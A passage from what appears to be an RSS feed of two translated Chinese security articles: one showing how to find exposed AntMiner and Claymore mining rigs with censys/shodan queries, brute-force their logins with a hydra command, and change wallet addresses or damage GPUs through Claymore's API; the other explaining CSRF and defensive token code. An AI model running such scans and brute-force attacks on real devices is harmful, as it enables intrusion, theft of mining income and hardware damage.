Configuration”（蚂蚁矿机配置信息）。 &lt;/p&gt;&lt;p&gt;我用了下面的语法在 &lt;a href=&quot;http://censys.io/&quot;&gt;censys&lt;/a&gt; 和 &lt;a href=&quot;http://shodan.io/&quot;&gt;shodan&lt;/a&gt; 收集了一些IP地址。 &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;(antminer) AND protocols.raw: “80/http” AND 80.http.get.title: “401” &lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-40f508941ee186bf725cbf007614d430_r.jpg&quot; data-caption=&quot;censys搜索语法 &quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;436&quot;&gt;&lt;p&gt;该系统可以通过暴力破解 HTTP 端口或 SSH 端口来访问。 &lt;/p&gt;&lt;p&gt;首先，我需要一个用户指南来得到 HTTP 的默认用户名和密码。之后，我在 Google 上搜索 “antminer default password” （蚂蚁矿机默认密码），并发现了这个“用户指南”。 &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-6dbf832f680a54fc129d2bd4c324b195_r.jpg&quot; data-caption=&quot;AntMiner用户手册&quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;562&quot;&gt;&lt;p&gt;对于本教程，我更喜欢使用 &lt;a href=&quot;https://tools.kali.org/password-attacks/hydra&quot;&gt;hydra&lt;/a&gt; 来进行暴力破解（爆破HTTP摘要认证），它使用了&lt;a href=&quot;https://github.com/danielmiessler/SecLists/tree/master/Passwords&quot;&gt;最常用的10.000密码&lt;/a&gt;。您也可以使用 &lt;a href=&quot;https://portswigger.net/burp&quot;&gt;Burp Suite&lt;/a&gt; &lt;a href=&quot;https://portswigger.net/burp&quot;&gt;&lt;/a&gt;的 Intruder 功能。 &lt;/p&gt;&lt;p&gt;下面是使用 hydra 的命令： &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;hydra -l root -P commonPasswords.txt -vV {TARGET} http-get / &lt;/code&gt;&lt;p&gt;如果你足够幸运，你就可以访问这个配置页面。 &lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-165b8a377f9171c8c0ac00292b440c5a_r.jpg&quot; data-caption=&quot;antMiner配置页面 &quot; data-rawwidth=&quot;769&quot; data-rawheight=&quot;585&quot;&gt;&lt;p&gt;攻击者可以任意编辑这个页面。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;Claymore 采矿软件 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;另一种类型的攻击也是针对 &lt;a href=&quot;https://github.com/nanopool/Claymore-Dual-Miner/releases&quot;&gt;Claymore&lt;/a&gt; 这个采矿软件（如 Altcoins，ethereum，zcash miner） &lt;/p&gt;&lt;p&gt;我使用了如下所示语法在 shodan 上搜索了一下： &lt;/p&gt;&lt;code lang=&quot;text&quot;&gt;Dorks: “ETH — Total Speed:” &lt;/code&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-451dea9797c2418d1207dd1ae7848667_r.jpg&quot; data-caption=&quot; Dorks：“ETH - Total Speed：” &quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;368&quot;&gt;&lt;p&gt;您可以通过 Claymore 远程管理  API 发送一些 JSON 数据包来管理采矿服务器。 &lt;/p&gt;&lt;p&gt;在这里，我们用一些命令控制 GPU 的使用模式（禁用，双模式等）或编辑 config.txt 来改变钱包池（pool wallet）的地址 &lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-49afe80f40aa78b986b5e0ef784f3feb_r.jpg&quot; data-caption=&quot;Claymore远程管理器API.txt &quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;463&quot;&gt;&lt;p&gt;我们将发送 “miner_restart” 或 “control_gpu” 命令来检测它是只读还是可写、可读的。我在MAC 系统上使用 NC 发送 JSON 命令。 &lt;/p&gt;&lt;p&gt;首先，我尝试 ” miner_getstat1” 这条指令 &lt;/p&gt;&lt;img src=&quot;https://pic4.zhimg.com/v2-5a71f4b8a959ea730f0a4720c0e872dc_r.jpg&quot; data-caption=&quot;此代码给出了采矿服务器的统计信息 &quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;217&quot;&gt;&lt;p&gt;之后，我使用 ” control_gpu” 来探测它是只读还是可读、可写的 &lt;/p&gt;&lt;p&gt;我收到了一个错误代码 &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-132db4ab092ebf963725e9e8892476c2_r.jpg&quot; data-caption=&quot;miner服务器具有只读模式 &quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;656&quot;&gt;&lt;p&gt;我通过不同的 IP 重启了系统，这表明 Claymore 的远程管理 API 允许读和写 &lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-73899e499741862cd5d8cbd21042c9a4_r.jpg&quot; data-caption=&quot;重启采矿服务器 &quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;44&quot;&gt;&lt;p&gt;Claymore 远程管理还允许您使用 JSON 格式（发送 json 文件）编辑配置文件。但是，您可以使用 Claymore’s Ethereum Dual Miner  管理工具在 Windows 上轻松编辑，这也可以更改钱包池的地址。 &lt;/p&gt;&lt;p&gt;miner 服务器具有只读模式 &lt;/p&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-7e0fa6249f4171f347d4129bda5f5024_r.jpg&quot; data-caption=&quot;如果您有读/写权限，可以编辑config.txt &quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;529&quot;&gt;&lt;img src=&quot;https://pic3.zhimg.com/v2-3e383fac6a3d38ab7c308b2240acf86d_r.jpg&quot; data-caption=&quot;您可以查看或编辑池的pool’s wallet的地址 &quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;609&quot;&gt;&lt;h2&gt;&lt;b&gt;攻击设想 :) &lt;/b&gt;&lt;/h2&gt;&lt;ul&gt;&lt;li&gt;我没有通过发送 JSON 命令在 Claymore  采矿软件上尝试命令注入。如果它有漏洞，您可以访问服务器而不需要具备有读写权限。 &lt;/li&gt;&lt;li&gt;您可以使用 OSINT 来改进搜索技巧从而收集大量数据。  &lt;/li&gt;&lt;li&gt;您甚至可以通过在编辑 config.txt 后控制风扇来损坏所有 GPU。&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;&lt;/p&gt;</description>
<author>Twosecurity</author>
<guid isPermaLink="false">2017-10-30-30583233</guid>
<pubDate>Mon, 30 Oct 2017 00:00:00 +0800</pubDate>
</item>
<item>
<title>Wiping Out CSRF</title>
<link>https://henix.github.io/feeds/zhuanlan.c_123166696/2017-10-24-30401930.htm</link>
<description>&lt;meta charset=&quot;utf-8&quot;&gt;
&lt;title&gt;Wiping Out CSRF&lt;/title&gt;
&lt;p&gt;&lt;a href=&quot;https://zhuanlan.zhihu.com/p/30401930&quot;&gt;原文&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;现在是2017年了，关于跨站请求伪造（CSRF）已经没有多少可以说的了。这是一个被熟知了多年的漏洞，在现在流行的 web 框架上也得到了一定的解决。那么为什么我们还在谈论呢？有几个原因：&lt;/p&gt;&lt;ol&gt;&lt;li&gt;传统的应用程序缺乏 CSRF 保护机制;&lt;/li&gt;&lt;li&gt;一些框架的构建不够完善;&lt;/li&gt;&lt;li&gt;应用程序没有很好的利用具有保护机制的框架;&lt;/li&gt;&lt;li&gt;新的应用程序不使用提供 CSRF 保护机制的现代框架。&lt;/li&gt;&lt;/ol&gt;&lt;p&gt;CSRF 仍然是 Web 应用程序中普遍漏洞。 这篇文章将深入地分析 CSRF 的工作原理以及当下的一些防御对策。随后我们将提供一种解决对策，可以运用在应用程序写完之后，不需要修改源代码。最后，我们将检测 cookie 的一种新扩展，如果成为一种标准，这可能就是大多数CSRF 案列的一个终结了。代码附在这里，其中包含测试用例的具体实现。[&lt;a href=&quot;https://www.github.com/jrozner/csrf-demo&quot;&gt;GitHub存储库&lt;/a&gt;] &lt;/p&gt;&lt;h2&gt;&lt;b&gt;理解攻击 &lt;/b&gt; &lt;/h2&gt;&lt;p&gt;在最根本的层面上，CSRF 是一个漏洞，攻击者强制受害者代表攻击者发出 HTTP 请求。这是一种完全发生在客户端的攻击（例如 Web 浏览器），其中接收方相信受害者正在发送可信任的应用程序信息。有三个组件能够发生攻击：不正确的使用危险的HTTP请求方式，Web浏览器对cookie的处理和跨站脚本攻击（XSS）。 HTTP  规范标准将请求方式分为安全的和不安全的两种。安全的请求方式（GET，HEAD 和 OPTIONS）旨在用于只读操作。使用它们的请求旨在返回有关所请求的资源的信息，并且不会对服务器产生任何副作用。不安全动词（POST，PUT，PATCH 和 DELETE）用于修改，创建或删除资源。不幸的是，HTTP 请求的的方式可能被忽略，或者是请求的意图没有被严格的限制。 不正确的请求方式使用的主要原因是由于 HTTP 规范的浏览器支持率历来较差。直到 XML  HTTP 请求（XHR）的流行，除了 GET 或 POST 之外，根本不可能使用不依赖于特定框架和库黑客的动词。这种限制导致区分 HTTP 请求方式变的实际无关紧要。仅仅这样做不足以创造 CSRF 的条件，但它有助于并使其保护更加困难。导致 CSRF 漏洞的最大因素是浏览器处理 Cookie 。 HTTP 最初被设计为无状态协议，具有对应于单个响应的单个请求，并且在请求之间不携带状态。为了支持复杂的Web 应用程序，创建 Cookie 作为在相关 HTTP 请求之间保持状态的解决方案。Cookie 驻留在浏览器的全局级别，并在实例，窗口和标签之间共享。用户依赖于网页浏览器，可以自动传送每个请求的 Cookie 。由于 cookie 可以在浏览器中访问/修改，并且没有防篡改保护，所以状态的存储已经转移到服务器管理的 session 中。在该模型中，在服务器上生成唯一的标识符并将其存储在 cookie 中。每个浏览器请求都会发送 cookie ，并且服务器能够查找该标识符，以确定它是否是一个有效的会话。会话结束时，服务器就不记得这个标识符了，之前发送的请求也将会失效。 问题在于浏览器是如何管理 cookie 的。一个 cookie 由几个属性组成，但我们关心的最重要的一个是 Domain 属性。Domain 属性的预期功能是将 Cookie 定位到与 cookie的 domain 属性相匹配的特定主机。这被设计为一种安全机制，以避免敏感信息（如会话标识符）被攻击者可能执行会话固定攻击的恶意网站被盗。这里的缺点是 domain 属性不依赖于同源策略（SOP）; 它只是将 Cookie 的 domain 的值与请求中的主机进行比较。这允许源自不同来源的请求也携带该主机的任何 cookie 。当且仅当安全和不安全的请求方式被正确使用时，这是安全的行为; 示例：安全请求（GET）不应该改变状态，但是我们已经看到正确的使用不一定值得信任。如果您不了解 SOP，那么您应该&lt;a href=&quot;https://en.wikipedia.org/wiki/Same-origin_policy&quot;&gt;阅读更多信息&lt;/a&gt;。&lt;/p&gt;&lt;p&gt;最重要的组件是跨站脚本攻击（XSS）。XSS 是受害者在 DOM 中呈现攻击者控制的JavaScript 或 HTML 的能力。如果 XSS 存在于应用程序中，那么在阻止 CSRF 攻击时它也就结束了。如果 XSS 是有效的，我们将在本文中讨论的主要对策，大多数应用程序依赖，可以被绕过的。 &lt;/p&gt;&lt;h2&gt;&lt;b&gt;进行攻击  &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;现在我们知道这些因素，让我们深入了解 CSRF 的工作原理。如果您尚未设置，现在将是遵循代码库中的说明并获取示例运行的好时机。README 中提供了基本设置的说明，以及入门指南。 我们将介绍三种传统的不同类型的 CSRF： &lt;/p&gt;&lt;p&gt;1.资源包含 &lt;/p&gt;&lt;p&gt;2.基于表单 &lt;/p&gt;&lt;p&gt;3.XMLHttpRequest &lt;/p&gt;&lt;p&gt;资源包含是在大多数介绍 CSRF 概念的演示或基础课程中可能看到的类型。这种类型归结为控制 HTML 标签（例如图像，音频，视频，对象，脚本等）所包含的资源的攻击者。如果攻击者能够影响 URL 被加载的话，包含远程资源的任何标签都可以完成攻击。 由于缺少对 Cookie的源点检查，如上所述，此攻击不需要 XSS，可以由任何攻击者控制的站点或站点本身执行。此类型仅限于 GET 请求，因为这些是浏览器对资源 URL 唯一的请求类型。这种类型的主要限制是它需要错误地使用安全的 HTTP 请求方式。 &lt;/p&gt;&lt;p&gt;我们将讨论的第二种类型是基于表单的 CSRF，通常在正确使用安全的请求方式时看到。攻击者创建自己的表单，模仿他们想要受害者提交的表单; 它包含一个 JavaScript 片段，强制受害者的浏览器提交表单。该表单可以完全由隐藏的元素组成，并且表单应该迅速地提交，以致受害者不能发现它。由于处理 cookies，攻击者可以在任何站点上发动攻击，只要受害者使用有效的 cookie 登录，攻击就会成功。如果请求是有目的性的，成功的攻击将使受害者回到他们平时正常的页面。该方法对于攻击者可以将受害者指向特定页面的网络钓鱼攻击特别有效。  &lt;/p&gt;&lt;p&gt;我们将讨论的最后一个主要类型是 XMLHttpRequest（XHR）。由于需求的需要，这可能是最不可能看到的。由于许多现代 Web 应用程序依赖 XHR，我们将花费大量的时间来构建和实现这一特定的对策。基于 XHR 的 CSRF 通常由于 SOP 而以 XSS 有效载荷的形式出现。没有跨域资源共享策略（CORS），XHR 仅限于攻击者托管自己的有效载荷的原始请求。这种类型的 CSRF 的攻击有效载荷基本上是一个标准的 XHR，攻击者已经找到了一些注入受害者浏览器 DOM 的方式。 &lt;/p&gt;&lt;p&gt;以下解决方案是可以用于实际部署的极大简化。它主要侧重于客户端和 token 管理。对请求和响应的拦截和修改有许多奇怪的边缘情况，需要大量关于本身运行平台的知识。理解平台的复杂性有很大的权衡，以避免理解和处理 CSRF 本身的复杂性。理想情况下，最好的解决方案是使用一个框架来提供内置和利用 CSRF 保护的框架。尽管有免责声明，但仍然存在许多理由，如下所述的解决方案是有道理的。  &lt;/p&gt;&lt;h2&gt;&lt;b&gt;现代防御 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;有许多例子都证明不可能修改应用程序来实现 CSRF 的防护。一方面源代码无法得到，另一方面修改应用程序的风险太高，或者由于应用程序的限制不容易完成。该解决方案特别适合部署在 RASP、WAF、反向代理或负载平衡器中，并且可用于为单个应用程序提供保护，或者使用相同配置的所有应用程序。当部署平台被理解得很好但是应用程序不被适用时，这是特别有用的。我们来讨论通常用于防范 CSRF 的现有解决方案，以及如何根据上述要求构建它们。  &lt;/p&gt;&lt;p&gt;首先，正确使用安全和不安全的 HTTP 请求方式很重要。这一点不是一个有效的解决方案，但它会使一切变得更加容易，接下来的两种方法取决于它。不幸的是，没有一个可以在事实之后应用的解决方案。这是在构建应用程序时需要做的，需要设计和架构。幸运的是，大多数现代Web 框架都有一个路由器的概念，它强制要求有个与 HTTP 请求方式配对的终端。在现代框架中，对与终端不匹配的请求会导致错误。如果这是您的应用程序无法实现的，我们稍后将讨论解决方法。  &lt;/p&gt;&lt;p&gt;下一个保护是验证请求的来源。该对策旨在确保进入应用程序的请求源自应用程序内的（或具有 CORS 的其他可信来源）。正确的请求方式很重要，因为只要我们假设只有状态改变的请求是不安全的，那么我们只需要验证不安全请求的来源。由于我们上面讨论的问题，验证安全请求的来源是有问题的。如果需要，那么一个解决方案是创建一个已知安全网址的排除列表，例如用户首次访问时将要访问的主页或可能的着陆页。这将防止外部来源的 CSRF，但允许用户到达网站的期望行为，并在首次访问时保持登录状态。 &lt;/p&gt;&lt;p&gt;这种保护并不是绝对必要的，但它增加了额外的层次，并且可能是您要使用 CORS 的一种解决方案。由于应用程序中的 SOP 和 token 的分配，CORS 使 token 的实现变得格外困难。源验证还取决于 HTTP 头的存在，但由于浏览器差异，浏览器扩展或某些请求条件而可能不存在的 HTTP 头。如果请求头缺少，则默认选项应始终是打开失败，并依赖不同层的解决方案来减轻 CSRF 。 &lt;/p&gt;&lt;p&gt;该保护通过将 Origin 或 Referer 头与请求中的 Host 头进行比较来起作用。Origin 标头仅在某些情况下使用，例如 XHR，并且可能不存在于所有请求中。它由完整的主机组成，包括端口。Referer 头显得更为常见，是发出请求时浏览器地址栏的完整URL。最后，Host 头是浏览器通知主机的服务器，包括端口（如果不是80），希望与之通信。这需要在单个应用服务器上支持虚拟主机或多个站点。在这种情况下，我们使用 Host 头作为比较的真实来源，因为我们知道 Host 头将对应于我们要强制进行原始检查的主机。首先检查 Origin头，然后检 Referer。这个顺序并不重要，甚至可以交换。需要一些基本的解析，并且确保只比较主机和端口，这一点非常重要。 &lt;/p&gt;&lt;p&gt;您可能会想知道的是，鉴于 Referer 欺骗的可能性和易用性，比较 referer 是否可信。有两个部分使这无关紧要。第一个是 Referer 欺骗的唯一方法是直接来自受害者。如前所述，这完全是客户端攻击，所以受害者的浏览器必须有意地伪造 Referer 来绕过检查。这是不太可能故意发生的事情。第二个因素是这些 Headers，Origin 和 Referer 不能被 JavaScript 设置，因为它们受到保护，并且如果攻击者的 XSS 有效负载尝试设置它们将导致错误。这也限制了任何对受害者浏览器上这些头的修改，假设用户永远不会故意去自己攻击自己、浏览器也正常工作，这或许是安全的。  &lt;/p&gt;&lt;p&gt;第三个也是最常用的对策是 token。token 有几个不同的种类，但是每种实现最终都使用同步token。要更完整的了解，您应该阅读“双重提交” tokens 和“加密” tokens。尽管此处讨论的解决方案较简单，但双重提交令牌应可用于以下解决方案，而加密令牌通常由于 AES 或其他选择的加密方案的成本而不太有效。相反，我们将使用同步器和加密的混合，提供最佳的两种解决方案。  &lt;/p&gt;&lt;p&gt;同步器 tokens 通过使用唯一的 token 让服务器和浏览器同步工作。对一个安全方法的请求服务器会返回一个 token，浏览器会随着每个不安全的请求一起返回给服务器，通常在表单正文或请求头，这具体取决于请求的类型。在允许请求继续之前，服务器验证该 token 是真实的和有效的; 服务器还将提供一个新的 token，以便令牌不会持续重复使用或打开来重复攻击。由于 SOP，这将阻止攻击者控制的主机上的 CSRF 有效载荷。攻击者将无法得到 token 并将其插入到请求中，因为这样做将要求攻击者能够强制受害者向远程站点请求并返回响应 - SOP 恰恰就是被设计来阻止这个的。攻击者唯一可以利用的就是应用程序里的xss跨站脚本。 &lt;/p&gt;&lt;p&gt;token 由四部分组成，必须保持完整性才能有效。任何一个的损失将显着削弱 token 的保护。这四个部分是随机数，用户标识符，期限和真实性验证：  &lt;/p&gt;&lt;p&gt;1.随机数的关键空间大小并不是太重要，只要它足够大以确保缺少重复。 &lt;/p&gt;&lt;p&gt;2.用户标识符可以是用户唯一的任何值。在我们的实现中，我们将选择使用会话标识符。  &lt;/p&gt;&lt;p&gt;3.寿命或到期时间是 token 有效的长度。理想情况下，您希望时间足够短，以至于被盗后不能长时间使用，但长度足以使真实用户使用它时不会过期，从而导致失败的请求。在大多数框架实现中，通常将 token 保存在 session 中并且随着 session 的超期而失效。这样做只有一个值在任何一个时间都有效，在我们的情况下不是这样，所以需要离散的到期。在我们的例子中，我们会默认一个小时。 &lt;/p&gt;&lt;p&gt;4.一定有办法保证 token 是真实的，并没有被篡改或伪造。在框架内实现的解决方案通常可以通过将该值存储在用户永远无法访问的服务器端会话存储中来。在我们的例子中，我们将依靠HMAC-SHA256，并提供一个可以验证的 token 的签名。这具体是另一个原因，因为攻击者还需要获取 HMAC 的密钥以伪造令牌。如果密钥被破坏，整个 token 和密钥空间是不相关的在这种情况下，随机性只是为令牌值提供一些额外的熵，以最小化被盗或泄漏令牌的有用性。这也是我们如何避免大多数框架依赖于会话存储的需求，同时获得比大多数加密令牌解决方案有更好的性能。 &lt;/p&gt;&lt;p&gt; token的实现有两个方面，服务器端处理token的生成/验证以及客户端，客户端将token发送到服务器以获取需要的请求。除了提供生成和验证的示例之外，我们不会深入到服务器端实现中，正如之前在声明中所说，处理拦截请求/响应的具体细节因平台而异。只需说一下，深入特定平台的中间件API，并使用它来实现接近以下步骤的操作。  &lt;/p&gt;&lt;p&gt;1.当前session是否有token？如果没有，请标记应生成token。 &lt;/p&gt;&lt;p&gt;2.请求是否需要验证？如果是，验证并标记该token已被使用。 &lt;/p&gt;&lt;p&gt;3.如果需要验证并失败，那么短路响应并停止处理。如果验证成功，则处理请求。  &lt;/p&gt;&lt;p&gt;4.如果token不存在或被标记为已使用，则生成新token并将添加其cookie到响应中。  &lt;/p&gt;&lt;p&gt;值得注意的是，每次生成一个新的token，即使没有验证，也不会增加任何安全性或者打开一个新的攻击向量。如果更容易，您可以在每个请求上生成一个新的令牌来构建您的实现。您将不会获得额外的保护，但是性能损失应该可以忽略不计。token被添加到cookie中，作为一种为浏览器提供值的方式，javascript 可以访问到它，浏览器也会自动的保存它。确保 HttpOnly标志永远不会用于此 cookie 这很重要。这样做会打破实施，但是没有任何安全问题，因为唯一的威胁来自 XSS，它提供了必要的条件来绕过 CSRF 的保护。 &lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;String generateToken(int userId, int key) {
 byte[16] data = random() 
 expires = time() + 3600
 raw = hex(data) + &quot;-&quot; + userId + &quot;-&quot; + expires 
 signature = hmac(sha256, raw, key) 
 return raw + &quot;-&quot; + signature 
} &lt;/code&gt;&lt;p&gt;以上是创建新 token 的简单示例。只是被连字符连接起来的四个部分。HMAC 将前三部分用于加密，以确保每个人的真实性，加密后的结果作为第四部分。选择连字符作为分隔符，因为冒号不是 Cookie 版本0 Cookie 的有效字符。使用它必须要升级到版本1，这可能会破坏与旧浏览器的一些兼容性。 &lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;bool validateToken(token, user) { 
parts = token.split(&quot;-&quot;) 
str = parts[0] + &quot;-&quot; + parts[1] + &quot;-&quot; + parts[2] 
generated = hmac(sha256, str, key) 
if !constantCompare(generated, parts[3]) { 
   return false
 } 
if parts[2] &amp;lt; time() {
    return false 
} 
if parts[1] != user {
      return false
} 
  return true 
}  &lt;/code&gt;&lt;p&gt;上面的代码块是一个验证 token 并计算有效性的简单示例。token 被分为四个部分，第一步是通过前三个部分重新生成 HMAC 并将其与期望的 HMAC 进行比较来验证 HMAC 。确保在这里使用一个恒定的时间来避免引入任何时序攻击。如果成功，我们验证token是否过期，用户是否匹配。从根本上来说这就是生成和检验 token 的流程。真正的威胁是用户的浏览器自动提交请求时也带上了 token。  &lt;/p&gt;&lt;p&gt;大多数现代框架在构建应用程序时都会为您考虑到了这一点。他们有库函数来处理 XHR，将token 插入到请求和模板助手中，以便将当前 token 包含在表单中。这是我们要模仿的功能：不依赖于框架为我们提供。相反，作为我们回应拦截的一部分，我们将在响应中添加或附加一小段 JavaScript。尽管严格测试绝对不符合规范，但几乎每个浏览器都将正确处理脚本标签，JavaScript 中分别添加或附加到打开或关闭 HTML 标签。我们将专门针对 HTML contentType的响应，以确保我们只将注入到我们不会中断的响应中，我们只修改非 XHR 的响应。这将避免我们将脚本多次加载到浏览器或 JSON 响应中。 &lt;/p&gt;&lt;p&gt;实现这一点有两个部分，一个是处理表单提交，另一个是处理 XHR 。第一个代码段是附加到onclick 事件的文档回调最小化版本。将它附加到文档而不是尝试附加到单个表单或可点击元素很重要，因为在附加时，表单或元素很可能不存在于 DOM 中，导致回调未触发。相反，我们附加到始终存在的文档，并委托给我们关心的元素。我们还需要使用 onclick 而不是onsubmit，因为 onsubmit 在所有浏览器和版本中都不会浮动，这意味着我们无法附加到文档并被调用。  &lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;var target = evt.target; 
while (target !== null) { 
  if (target.nodeName === &#39;A&#39; || target.nodeName === &#39;INPUT&#39; || 
      target.nodeName === &#39;BUTTON&#39;) {
        break; 
     } 
     target = target.parentNode; 
   } // We didn&#39;t find any of the delegates, bail out 
if (target === null) { 
 return; 
} &lt;/code&gt;&lt;p&gt;第一节抓取被触发事件的目标元素。这是用户点击的元素。由于 DOM 的树结构和事件冒泡系统，这个元素可能不是我们感兴趣的元素，而是我们必须走出 DOM 寻找可以提交表单的元素; 在这种情况下，比如：&amp;lt;a&amp;gt;、&amp;lt;input&amp;gt; 或 &amp;lt;button&amp;gt; 标签。如果我们在发现一个 DOM 之前到达 DOM 的顶端，那么就轻松了，因为它是一个没有提交表单的元素上的点击事件。  &lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;// If it&#39;s an input element make sure it&#39;s of type submit 
var type = target.getAttribute(&#39;type&#39;); 
if (target.nodeName === &#39;INPUT&#39; &amp;amp;&amp;amp; (type === null || !type.match(/^submit$/i))) { 
   return; 
   } // Walk up the DOM to find the form var form; 
for (var node = target; node !== null; node = node.parentNode) { 
    if (node.nodeName === &#39;FORM&#39;) { 
        form = node; break; 
                                     } 
  } if (form === undefined) { 
  return; 
} &lt;/code&gt;&lt;p&gt;接下来我们检查标签是否是 &amp;lt;input&amp;gt; 。如果是，那么我们要确保它是一个提交按钮。否则它不会提交表单 , 而只是使浏览器关注元素。一旦我们确定目标导致提交事件的发生，那么继续从DOM 中寻找一个表单标签。如果我们到达 DOM 的顶端，但没有找到一个表单标签，那么该元素不会被提交，除非它使用 XHR，这将被 XHR 相关代码部分处理。 &lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;var token = form.querySelector(&#39;input[name=&quot;csrf_token&quot;]&#39;); 
var tokenValue = getCookieValue(&#39;CSRF-TOKEN&#39;); 
if (token !== undefined &amp;amp;&amp;amp; token !== null) { if (token.value !== tokenValue) { 
     token.value = tokenValue; 
} 
  return; 
} 
var newToken = document.createElement(&#39;input&#39;); 
newToken.setAttribute(&#39;type&#39;, &#39;hidden&#39;); 
newToken.setAttribute(&#39;name&#39;, &#39;csrf_token&#39;); 
newToken.setAttribute(&#39;value&#39;, tokenValue); 
form.appendChild(newToken); &lt;/code&gt;&lt;p&gt;一旦找到表单，剩下的唯一步骤就是把这个 token 添加到 form 中作为一个隐藏的输入元素。第一步是从先前的提交中检查元素是否已经存在。如果是，请检查该值，并在必要时进行更改。如果没有，则创建一个新元素并将其附加到表单中。由于冒泡的作用方式，此处理程序在提交表单之前触发，并在处理程序返回之前将元素添加到表单中，导致浏览器提交的请求带有表单中的新元素，然后将token添加到正文的请求。 对于非基于表单的请求，需要一种将token存入 XHR 请求的方法。大多数库都提供抽象方法，包括 jQuery，这使得这更容易，因为它们提供了可以修改请求的回调函数，允许不同的请求。不幸的是，我们不能假设一个特定的库将会出现，并且需要为标准的 XHR API 创建我们自己的 hook。为了做到这一点，我们将包装和修补对象本身以添加额外的功能。 &lt;/p&gt;&lt;code lang=&quot;js&quot;&gt;XMLHttpRequest.prototype._send = XMLHttpRequest.prototype.send;   XMLHttpRequest.prototype.send = function（）{ 
 if（！this.isRequestHeaderSet（&#39;X-Requested-With&#39;））{ 
 this.setRequestHeader（&#39;X-Requested-With&#39;，&#39;XMLHttpRequest&#39;）; 
} 
var tokenValue = getCookieValue（&#39;CSRF-TOKEN&#39;）;
 if（tokenValue！== null）{
 this.setRequestHeader（&#39;X-CSRF-Header&#39;，tokenValue）;
} 
this._send.apply（this，arguments）; 
}; &lt;/code&gt;&lt;p&gt;通过利用 JavaScript 的原型继承和动态性质，我们将原始发送方法的副本保存到对象上，以便我们可以保留对其的引用以供稍后使用。然后，我们创建一个附加到发送原型的新函数，该原型从 cookie 中提取 token，并向请求中添加一个带有值的 header 。真正的发送方法通过保存的 referer 来调用，原始参数通过它们按预期工作。就浏览器中的代码而言，认为 API 没有改变，XHR 对象也并没有不同，但是我们现在强制所有请求都在服务器可以读取的 header 中提交一个 CSRF token。 这个实现的一个特别的注意事项是，由于原型支持和 XHR 可用性，它只能用于 Internet Explorer（IE）8。XHR 被引入 Internet Explorer 7，但是不存在正确的原型支持，需要额外的解决方案来完善此功能。至少 IE6 可以使用基于表单的解决方案。可能有一种方法可以通过自定义的 ActiveX 控件为旧版本的IE版本添加额外的支持，但不在本文的范围之内。处理旧版本浏览器缺乏支持的另一个解决方案是简单地不执行 CSRF 检查，而是检查用户代理头。尽管如此，这些可能并不总是存在并且可能被伪造，这样做将需要受害者主动地忽略安全性问题或已经被恶意软件或 XSS 攻击而泄密。所有其他浏览器似乎都有很好的支持，如下图所示。上面的代码可能会被比以下版本更老的浏览器支持，但是，查找测试副本很难，这些版本的浏览器也覆盖了大多数人常用的。 &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-bf361cde736992b907623bcaa84b5e74_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;315&quot;&gt;&lt;h2&gt;&lt;b&gt;关于未来 &lt;/b&gt;&lt;/h2&gt;&lt;p&gt;现在我们已经根据当前的实践构建了涵盖一个适用于旧版本浏览器到现代浏览器的解决方案，现在是时候来看看一个新的解决方案，这可能是大多数CSRF案例的完结了。这是一种扩展名为 Same-Site 的 Cookie 的扩展形式，它增加了对 Cookie 源的检查。Same-Site 允许浏览器限制只发送来自与域匹配的主机的请求发送的 cookie，大大地取代了对同步器令牌的需求。有两种形式，strict 和 lax。strict 会检查所有安全和不安全的请求，而 lax 只支持检查不安全的请求。大多数应用程序将需要配置为 lax，因为保护安全请求就不允许将会话 cookie 与原始 GET 请求一起发送到站点。 在撰写本文时，浏览器支持非常之少，主要是 Chrome 支持该功能。下表列出了从&lt;a href=&quot;https://www.caniuse.com&quot;&gt;这里&lt;/a&gt;得到的信息。但是，作为扩展程序，Same-Site不会破坏不支持旧浏览器对 Cookie 的兼容性。较老的浏览器将会自动忽略此项 功能。 &lt;/p&gt;&lt;img src=&quot;https://pic2.zhimg.com/v2-78c29c936a5566f150bffe4a391cace8_r.jpg&quot; data-caption=&quot;&quot; data-rawwidth=&quot;800&quot; data-rawheight=&quot;357&quot;&gt;&lt;p&gt;在撰写本文时，Same-Site 还只是以草案存在，我不知道有任何可以支持这种功能的 Cookie库。只有这种方式变得更稳定和被多数人接受，才可能像token一样地使用。它可以与同步器token 结合使用，以支持较旧和较旧的浏览器。Same-Site 的一个缺点是缺乏 CORS 支持。在撰写本文时，没有提及添加对白名单特定来源的支持，以安全地发送 cookies。这将会破坏依赖于向服务器提供状态信息的 Cookie 的 CORS 请求。一个潜在的解决方法是删除仅用于不使用 Same-Site 并执行源验证的外部站点的第二个 cookie&lt;/p&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;p&gt;参考：&lt;a 